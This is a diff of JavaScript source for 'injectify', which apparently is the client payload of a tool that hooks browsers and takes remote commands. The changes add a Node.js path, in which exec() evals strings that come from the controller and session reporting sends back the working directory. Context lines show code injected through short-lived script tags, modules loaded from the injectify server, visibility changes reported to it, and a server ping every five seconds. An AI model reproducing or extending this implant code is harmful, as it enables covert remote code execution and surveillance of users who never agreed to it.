@@ -122,23 +122,33 @@ window['injectify'] = /** @class */ (function () {
      * @param {element} targetParent element to execute the script under, defaults to document.head
      */
     Injectify.exec = function (func, targetParent) {
-        /**
-         * Default o using document.head as the script container
-         */
-        if (!targetParent)
-            targetParent = document.head;
-        /**
-         * Turn the function into a self-executing constructor
-         */
-        if (typeof func === 'function')
-            func = '(' + func.toString() + ')()';
-        /**
-         * Create, append & remove a script tag
-         */
-        var script = document.createElement('script');
-        script.innerHTML = func;
-        targetParent.appendChild(script);
-        targetParent.removeChild(script);
+        if (this.info.platform === 'browser') {
+            /**
+             * Default o using document.head as the script container
+             */
+            if (!targetParent)
+                targetParent = document.head;
+            /**
+             * Turn the function into a self-executing constructor
+             */
+            if (typeof func === 'function')
+                func = '(' + func.toString() + ')()';
+            /**
+             * Create, append & remove a script tag
+             */
+            var script = document.createElement('script');
+            script.innerHTML = func;
+            targetParent.appendChild(script);
+            targetParent.removeChild(script);
+        }
+        else {
+            if (typeof func === 'string') {
+                eval('(' + func + ')()');
+            }
+            else {
+                func();
+            }
+        }
     };
     /**
      * Loads a module from the injectify server
@@ -247,29 +257,40 @@ window['injectify'] = /** @class */ (function () {
          * Returns information about the current session, browser etc.
          */
         get: function () {
-            /**
-             * Get the correct document.hidden method
-             */
-            var hidden = 'hidden';
-            if ('mozHidden' in document) {
-                hidden = 'mozHidden';
-            }
-            else if ('webkitHidden' in document) {
-                hidden = 'webkitHidden';
-            }
-            else if ('msHidden' in document) {
-                hidden = 'msHidden';
-            }
-            /**
-             * Return object
-             */
-            return {
-                'window': {
-                    'url': window.location.href,
-                    'title': document.title ? document.title : window.location.host + window.location.pathname,
-                    'active': !document[hidden],
+            if (this.info.platform === 'browser') {
+                /**
+                 * Get the correct document.hidden method
+                 */
+                var hidden = 'hidden';
+                if ('mozHidden' in document) {
+                    hidden = 'mozHidden';
                 }
-            };
+                else if ('webkitHidden' in document) {
+                    hidden = 'webkitHidden';
+                }
+                else if ('msHidden' in document) {
+                    hidden = 'msHidden';
+                }
+                /**
+                 * Return object
+                 */
+                return {
+                    'window': {
+                        'url': window.location.href,
+                        'title': document.title ? document.title : window.location.host + window.location.pathname,
+                        'active': !document[hidden],
+                    }
+                };
+            }
+            else {
+                return {
+                    'window': {
+                        'url': require('file-url')(process.cwd()),
+                        'title': process.cwd(),
+                        'active': true,
+                    }
+                };
+            }
         },
         enumerable: true,
         configurable: true
@@ -393,31 +414,33 @@ injectify.listener(function (data, topic) {
  * Page Visibility API
  */
 (function () {
-    var listener;
-    var focusChange = function () { return injectify.send('i', injectify.sessionInfo); };
-    /**
-     * Get the correct hidden listener
-     */
-    if ('hidden' in document) {
-        listener = 'visibilitychange';
+    if (injectify.info.platform === 'browser') {
+        var listener = void 0;
+        var focusChange = function () { return injectify.send('i', injectify.sessionInfo); };
+        /**
+         * Get the correct hidden listener
+         */
+        if ('hidden' in document) {
+            listener = 'visibilitychange';
+        }
+        else if ('mozHidden' in document) {
+            listener = 'mozvisibilitychange';
+        }
+        else if ('webkitHidden' in document) {
+            listener = 'webkitvisibilitychange';
+        }
+        else if ('msHidden' in document) {
+            listener = 'msvisibilitychange';
+        }
+        else {
+            window.onpageshow = window.onpagehide = window.onfocus = window.onblur = focusChange;
+        }
+        /**
+         * Add listener
+         */
+        if (listener)
+            document.addEventListener(listener, focusChange);
     }
-    else if ('mozHidden' in document) {
-        listener = 'mozvisibilitychange';
-    }
-    else if ('webkitHidden' in document) {
-        listener = 'webkitvisibilitychange';
-    }
-    else if ('msHidden' in document) {
-        listener = 'msvisibilitychange';
-    }
-    else {
-        window.onpageshow = window.onpagehide = window.onfocus = window.onblur = focusChange;
-    }
-    /**
-     * Add listener
-     */
-    if (listener)
-        document.addEventListener(listener, focusChange);
 })();
 /**
  * Ping the server every 5 seconds to sustain the connection
